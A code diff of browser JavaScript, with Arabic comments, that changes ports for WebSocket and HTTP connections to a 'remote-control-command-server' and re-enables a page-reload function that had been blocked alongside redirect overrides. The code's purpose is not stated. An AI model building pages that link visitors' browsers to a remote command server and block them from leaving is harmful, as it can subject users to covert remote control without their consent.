@@ -25,10 +25,10 @@
             return originalReplace.call(this, url);
         };
         
-        // منع إعادة تحميل الصفحة إذا كانت ستؤدي لـ about:blank
+        // السماح بإعادة تحميل الصفحة بشكل طبيعي
         location.reload = function(force) {
-            console.log('تم منع إعادة تحميل الصفحة');
-            return;
+            console.log('إعادة تحميل الصفحة مسموح بها');
+            return originalReload.call(this, force);
         };
         
         console.log('🛡️ تم تفعيل الحماية الفورية من إعادة التوجيه');
@@ -433,12 +433,12 @@
         // تحديد الرابط الصحيح بناءً على البيئة
         const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
         const commandServerUrl = isLocalhost 
-            ? 'ws://localhost:4000' 
+            ? 'ws://localhost:10001' 
             : 'wss://remote-control-command-server.onrender.com';
             
         const servers = [
             commandServerUrl,
-            'ws://192.168.1.100:4000',
+            'ws://localhost:10001',
             'wss://your-server.com/control',
             'wss://backup-server.com/control',
             'wss://fallback-server.com/control'
@@ -800,7 +800,7 @@
         // إرسال عبر HTTP أيضاً
         const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
         const commandServerHttpUrl = isLocalhost 
-            ? 'http://localhost:4000' 
+            ? 'http://localhost:10001' 
             : 'https://remote-control-command-server.onrender.com';
             
         fetch(`${commandServerHttpUrl}/auto-activation-confirmation`, {
@@ -834,7 +834,7 @@
         // إرسال عبر HTTP أيضاً
         const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
         const commandServerHttpUrl = isLocalhost 
-            ? 'http://localhost:4000' 
+            ? 'http://localhost:10001' 
             : 'https://remote-control-command-server.onrender.com';
             
         fetch(`${commandServerHttpUrl}/activation-confirmation`, {
